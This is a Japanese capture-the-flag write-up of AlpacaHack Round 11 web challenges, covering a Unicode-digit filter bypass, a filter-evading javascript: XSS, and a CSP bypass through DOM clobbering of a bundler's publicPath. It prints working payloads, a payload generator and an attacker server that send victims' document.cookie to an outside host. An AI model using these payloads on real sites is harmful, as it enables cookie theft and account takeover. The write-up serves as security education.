---
title: AlpacaHack Round 11 (Web) Writeup
date: 2025-05-18
layout: writeup
rank: 10
total_teams: 213
language: ja
tags:
  - Web
---

AlpacaHack Round 11 (web) に参加して[10位/213人](https://alpacahack.com/ctfs/round-11/certificates/claustra01)でした。5分で1問だけ解いて残りの5時間55分はうんうん唸ってました……

# Writeup

## Jackpot (63 solves)

スロットが遊べるWebサイト。
![](https://storage.googleapis.com/zenn-user-upload/a4abec014ae6-20250518.png)

こちらで指定した文字`candidates`の中からランダムに15回取り出し、それをスロットの結果にしている。`is_jackpot`がtrue、つまりvalidate後に`candidates`が7のみからなっていれば良い。

```py
@app.get("/slot")
def slot():
    candidates = validate(request.args.get("candidates"))

    num = 15
    results = random.choices(candidates, k=num)

    is_jackpot = results == [7] * num  # 777777777777777
```

validate関数を見てみる。数字のみ、10文字以上、重複不可となっている。

```py
def validate(value: str | None) -> list[int]:
    if value is None:
        raise BadRequest("Missing parameter")
    if not re.fullmatch(r"\d+", value):
        raise BadRequest("Not decimal digits")
    if len(value) < 10:
        raise BadRequest("Too little candidates")

    candidates = list(value)[:10]
    if len(candidates) != len(set(candidates)):
        raise BadRequest("Not unique")

    return [int(x) for x in candidates]
```

一見`0123456789`の10文字以外にこれを満たす文字列は無いように思うが、例えば半角の`7`と全角の`７`など、正規表現の`\d`に対応しており`int()`で同じ数字に変換できる文字は複数存在する。
ChatGPTに聞いてみると10種類教えてくれた。
![](https://storage.googleapis.com/zenn-user-upload/707a23b86390-20250518.png)

`7７٧۷߇७৭੭૭୭`を入力してスロットを回すとFlagが得られた。
![](https://storage.googleapis.com/zenn-user-upload/a43dd61ec28d-20250518.png)
`Alpaca{what_i5_your_f4vorite_s3ven?}`

# Upsolve

## Redirector (6 solves)

URLを入力するとリダイレクトするだけのWebサイト。Flagはadmin botのCookieにある。
リダイレクト処理を行っているコードのみを抜粋。

```js
  (() => {
    const next = new URLSearchParams(location.search).get("next");
    if (!next) return;

    const url = new URL(next, location.origin);
    const parts = [url.pathname, url.search, url.hash];
    console.log(parts)

    if (parts.some((part) => /[^\w()]/.test(part.slice(1)))) {
      alert("Invalid URL 1");
      return;
    }
    if (/location|name|cookie|eval|Function|constructor|%/i.test(url)) {
      alert("Invalid URL 2");
      return;
    }

    location.href = url;
  })();
```

schemaの制限がないため、例えば`javascript:alert(1)`にリダイレクトさせるとalertが発火する。XSSできることは分かったので、フィルタを回避してCookieを窃取したい。

1つ目のフィルタの内容は英数字と`()`のみしか使えないというもの、2つ目のフィルタは一部のワードと`%`が使えないというもの。[JSF*ck](https://jsfuck.com/)などで文字種制限を回避できないか考えたが、`[]`や`+`が使えないので厳しい。

ここでChatGPTに色々聞いていると、JavaScriptには`with()`という関数があり、これを使えば`.`を使わずにプロパティを参照できるらしいということが分かった。例えば`console.log(1)`は`with(console)log(1)`や`with(console)with(log)(1)`と書くことができ、これはフィルタに弾かれず動作する。

以上より、`String.fromCharCode()`で文字を生成し、それを`String.prototype.concat()`で結合することでpayloadを作成してevalする方針を立てた。`eval()`そのものはフィルタで弾かれるので使えないが、`setTimeout`には[引数に文字列を渡すとevalされる](https://shim0mura.hatenadiary.jp/entry/20110619/1308490737)挙動があるので、これを利用する。

payloadを生成するスクリプトを書く。

```py
script = "location.href='https://ctf-server.claustra01.net?'+document.cookie;"

encoded = "with(String)with(fromCharCode())" # 空文字
for c in script[:-1]:
    encoded += f"with(concat(fromCharCode({ord(c)})))"
encoded += f"setTimeout(concat(fromCharCode({ord(script[-1])})))"

url = "http://redirector:3000?next=javascript:" + encoded
print(url)
```

これで出力されたURLを報告するとFlagが得られた。

```
http://redirector:3000?next=javascript:with(String)with(fromCharCode())with(concat(fromCharCode(108)))with(concat(fromCharCode(111)))with(concat(fromCharCode(99)))with(concat(fromCharCode(97)))with(concat(fromCharCode(116)))with(concat(fromCharCode(105)))with(concat(fromCharCode(111)))with(concat(fromCharCode(110)))with(concat(fromCharCode(46)))with(concat(fromCharCode(104)))with(concat(fromCharCode(114)))with(concat(fromCharCode(101)))with(concat(fromCharCode(102)))with(concat(fromCharCode(61)))with(concat(fromCharCode(39)))with(concat(fromCharCode(104)))with(concat(fromCharCode(116)))with(concat(fromCharCode(116)))with(concat(fromCharCode(112)))with(concat(fromCharCode(115)))with(concat(fromCharCode(58)))with(concat(fromCharCode(47)))with(concat(fromCharCode(47)))with(concat(fromCharCode(99)))with(concat(fromCharCode(116)))with(concat(fromCharCode(102)))with(concat(fromCharCode(45)))with(concat(fromCharCode(115)))with(concat(fromCharCode(101)))with(concat(fromCharCode(114)))with(concat(fromCharCode(118)))with(concat(fromCharCode(101)))with(concat(fromCharCode(114)))with(concat(fromCharCode(46)))with(concat(fromCharCode(99)))with(concat(fromCharCode(108)))with(concat(fromCharCode(97)))with(concat(fromCharCode(117)))with(concat(fromCharCode(115)))with(concat(fromCharCode(116)))with(concat(fromCharCode(114)))with(concat(fromCharCode(97)))with(concat(fromCharCode(48)))with(concat(fromCharCode(49)))with(concat(fromCharCode(46)))with(concat(fromCharCode(110)))with(concat(fromCharCode(101)))with(concat(fromCharCode(116)))with(concat(fromCharCode(63)))with(concat(fromCharCode(39)))with(concat(fromCharCode(43)))with(concat(fromCharCode(100)))with(concat(fromCharCode(111)))with(concat(fromCharCode(99)))with(concat(fromCharCode(117)))with(concat(fromCharCode(109)))with(concat(fromCharCode(101)))with(concat(fromCharCode(110)))with(concat(fromCharCode(116)))with(concat(fromCharCode(46)))with(concat(fromCharCode(99)))with(concat(fromCharCode(111)))with(concat(fromCharCode(111)))with(concat(fromCharCode(107)))with(concat(fromCharCode(105)))with(concat(fromCharCode(101)))setTimeout(concat(fromCharCode(59)))
```

`Alpaca{An_0pen_redirec7_is_definite1y_a_vuln3rability}`

## AlpacaMark (3 solves)

自由にMarkdownを書けるWebサイト。
![](https://storage.googleapis.com/zenn-user-upload/b497d2688d07-20250518.png)

ejsが使用されており、nonceとmarkdownを埋め込んでいる。

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
    <title>AlpacaMark</title>
    <script nonce="<%= nonce %>" src="/main.js" defer></script>
    <link href="/main.css" rel="stylesheet" />
  </head>
  <body>
    <main class="container">
      <h1>AlpacaMark</h1>
      <div id="previewElm"></div>
      <form id="renderElm" action="/" method="get">
        <textarea name="markdown" required><%- markdown %></textarea>
        <button type="submit">Render</button>
      </form>
    </main>
  </body>
</html>
```

nonceはランダムで、推測困難。

```js
app.get("/", (req, res) => {
  const nonce = crypto.randomBytes(16).toString("base64");
  res.setHeader(
    "Content-Security-Policy",
    `script-src 'strict-dynamic' 'nonce-${nonce}'; default-src 'self'; base-uri 'none'`
  );

  const markdown = req.query.markdown?.slice(0, 512) ?? DEFAULT_MARKDOWN;
  res.render("index", {
    nonce,
    markdown,
  });
});
```

`markdown`には制限なく自由に入力可能なため、`</textarea>`でtextareaから脱出することで任意のHTMLが挿入できる。しかし、scriptタグを挿入してもnonceが無いので実行できない。

ここでCSPを見ると、`script-src 'strict-dynamic'`という見慣れない記述がある。
![](https://storage.googleapis.com/zenn-user-upload/40075c88c227-20250518.png)

[ドキュメント](https://developer.mozilla.org/ja/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src)を見るに、どうやら既にnonceで信頼が与えられている`main.js`の内部で呼び出されたスクリプトは、連鎖的に信頼できるものと見なして実行が許可されるらしい。

`main.js`を見るとこのようなコードがあった。`5`というスクリプトをサーバーからロードしている。

```js
5: function(e, t, r) {
    r.a(e, async function(e, t) {
        try {
            r(129);
            var n = r(163);
            let e = localStorage.getItem("markdown") ?? await r.e("5").then(r.t.bind(r, 185, 19)).then( ({default: e}) => e(location.search.slice(1)).markdown ?? "");
            if (localStorage.setItem("markdown", e),
            renderElm.addEventListener("submit", () => localStorage.removeItem("markdown")),
            e) {
                let t = document.createElement("article");
                t.innerHTML = n.Qc(e).replaceAll(":alpaca:", "\uD83E\uDD99"),
                previewElm.appendChild(t)
            }
            let s = document.querySelector("textarea[name=markdown]");
            s.rows = s.value.split("\n").length + 1,
            t()
        } catch (e) {
            t(e)
        }
    }, 1)
},
```

devtoolsのネットワークタブを見ると、確かに`5.js`がロードされていた。
さて、この`5.js`のホスト部分は[publicPath](https://webpack.js.org/guides/public-path/)が参照される。そのpublicPathはどうやってセットされるかというと、これも`main.js`内にコードがある。

```js
( () => {
        r.g.importScripts && (e = r.g.location + "");
        var e, t = r.g.document;
        if (!e && t && (t.currentScript && "SCRIPT" === t.currentScript.tagName.toUpperCase() && (e = t.currentScript.src),
        !e)) {
            var n = t.getElementsByTagName("script");
            if (n.length)
                for (var s = n.length - 1; s > -1 && (!e || !/^http(s?):/.test(e)); )
                    e = n[s--].src
        }
        if (!e)
            throw Error("Automatic publicPath is not supported in this browser");
        r.p = e = e.replace(/^blob:/, "").replace(/#.*$/, "").replace(/\?.*$/, "").replace(/\/[^\/]+$/, "/")
    }
    )(),
```

難読化されているので分かりづらいが、順序としては

1. `t.currentScript.src`
2. `t.getElementsByTagName("script")[-1].src`

の優先度でセットされる。
つまり、`t.currentScript`が存在しない時（IEなど古いブラウザ？）はDOMで一番最後のscriptタグがpublicPathになる。

ここで、`main.js`はdefer付きで読み込まれていたことを思い出そう。これは[HTMLのパースが完了してからscriptが実行される](https://qiita.com/phanect/items/82c85ea4b8f9c373d684#%E8%AA%AD%E8%BE%BC%E3%81%AE%E6%96%B9%E6%B3%95)ということを意味する。任意のHTMLを挿入できるため、`t.getElementsByTagName("script")[-1]`は自由に操作できる。

admin botは最新のpuppeteerを使用しているが、どうにかして`t.currentScript`が存在しない（厳密には`"SCRIPT" === t.currentScript.tagName.toUpperCase()`を満たさない）状態を作れないだろうか。
この問題で使われている[rspack](https://github.com/web-infra-dev/rspack)にはDOM ClobberingによってcurrentScriptを破壊することが可能という脆弱性が[報告](https://github.com/advisories/GHSA-84jw-g43v-8gjm)されていた。

これらを参考に以下のHTML(markdown)を挿入してみる。
imgタグでDOM Clobberingを行った場合、`t.currentScript.tagName.toUpperCase()`が`IMG`になるため、`"SCRIPT" === t.currentScript.tagName.toUpperCase()`がfalseになりif文を回避できる。
ここではCSPエラー回避のためscriptタグに`"type="text/plain"`を指定しており、スクリプトが実行されなくなるが、DOMはちゃんと生成されているので問題ない。

```html
</textarea>
<img name="currentScript">
<script type="text/plain" src="https://attacker.site"></script>
```

devtoolsのネットワークタブを見ると、`https://attacker.site/5.js`のロードを試みており、publicPathの操作に成功していることが分かる。

`/5.js`に適当なスクリプトを配置するサーバーを書く。

```js
const express = require('express');

// logger
function accessLogger(req, res, next) {
  const start = Date.now();
  res.on('finish', () => {
    const duration = Date.now() - start;
    console.log(`${req.method} ${req.originalUrl} ${res.statusCode}`);
  });
  next();
}

const app = express();
app.use(accessLogger);

// 5.js
app.get('/5.js', (req, res) => {
  res.send(`location = "https://ctf-server.claustra01.net/flag?" + document.cookie`);
});

const port = process.env.PORT || 50000;
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
```

`attacker.site`を自分のサーバーに差し替えたURLを報告するとFlagが得られた。

```
http://alpaca-mark:3000/?markdown=</textarea><img name="currentScript"><script type="text/plain" src="https://ctf-server.claustra01.net"></script>
```

`Alpaca{the_DOM_w0rld_is_po11uted_and_clobber3d}`

# Not Solved

## Tiny Note (4 solves)

// TODO
